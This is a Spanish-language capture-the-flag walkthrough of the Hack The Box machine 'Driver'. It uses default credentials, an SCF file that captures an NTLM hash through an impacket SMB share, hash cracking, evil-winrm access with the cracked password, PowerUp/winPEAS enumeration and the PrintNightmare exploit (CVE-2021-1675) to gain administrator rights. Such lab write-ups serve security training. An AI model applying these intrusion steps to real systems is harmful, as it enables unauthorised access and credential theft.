___

# Máquina Driver (HTB)

**IP atacante: 10.10.17.214**
**IP víctima: 10.129.58.204**

Comprobamos conexión con la máquina

![[driver_ping.png]]

TTL = 127 -> Máquina Windows
___

# Reconocimiento y enumeración de puertos abiertos

Realizamos un nmap para descubrir posibles puertos abiertos


![[driver_nmap.png]]

Puertos abiertos:

- 80 HTTP 
- 135 MSRPC  
	Este servicio se utiliza para la comunicación entre procesos, gestión y servicios de Windows, modelo cliente-servidor
- 445 Microsoft-ds
- 5985 wsman 
	Este servicio se utiliza para gestionar equipos de forma remota a través de la red 

Con la función `crackmapexec` podemos ver ante que nos estamos enfrentando

![[driver_crackmapexec.png]]

Al ver la web nos pedirá credenciales válidas, por lo que usamos las que son por defecto `admin:admin`

![[driver_adminadmin.png|900]]

En el apartado de Firmware Updates podemos subir un archivo firmware, así que nos aprovechamos de esto y creamos un archivoi `.scf` para subirlo.

![[driver_filecsf.png]]

Esto quiere decir que cogerá un archivo `pentestlab.ico` del recurso compartido smbFolder

Ahora creamos el recurso compartido

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
# smb2support para darle soporte a la versión 2 de smb (porque es Windows 10)
```

![[driver_recursocompartido.png]]

Subimos el archivo a la web y nos aparecerá el usuario que se intentó conectar

![[driver_smb.png]]

Copiamos todo y lo metemos a un archivo llamado `hash` para crackearlo con John The Ripper

![[driver_crackhash.png]]

Podemos comprobar que la credencial es correcta

![[driver_validateuser.png]]

También con winrm para saber si nos podemos conectar al servicio de administración remota con Windows con `evil-winrm`

![[driver_winrm.png]]


Haciendo uso del siguiente comando, nos conectamos de forma remota con el usuario `tony` y ver la flag

```bash
evil-winrm -i 10.129.58.241 -u 'tony' -p 'liltony'
```

![[driver_userflag.png]]

También comprobamos que ``tony`` pertenece al grupo `Remote Management Use`

![[driver_groupmanagementuser.png]]


# Escalar privilegios | Dos formas

Podemos ver qué privilegios tiene el usuario `tony`

![[driver_tonyprivileges.png]]

Como no vemos nada interesante, podemos usar el recurso `PowerUp.ps1` para detectar vías potenciales para escalar privilegios.

```bash
wget https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Privesc/PowerUp.ps1
```

Agregamos al final la siguiente línea para ver todas las posibles formas de escalar privilegios.

```plaintext
Invoke-AllChecks
```

Para ejecutarlo, nos compartimos un servicio http con python

```bash
python3 -m http.server 80
```

![[driver_reportpriv.png]]

___
También podemos usar el recurso ``winPEAS64.exe``

```plaintext
Descargamos: https://github.com/peass-ng/PEASS-ng/releases
```

![[driver_getwinpeas.png]]

Nos reporta el proceso ``spoolsv``, por lo que buscamos un exploit para dicha máquina

```plaintext
https://github.com/calebstewart/CVE-2021-1675/blob/main/README.md
```

Sincronizamos

![[driver_cve.png]]

Creamos un nuevo usuario y vemos que el usuario creado, esta en el grupo de administradores.

![[driver_createuser.png]]

Ya que tenemos este nuevo usuario, podemos utilizarlo para conectarnos por `evil-winrm` y ver la flag de root.

![[driver_rootflag.png]]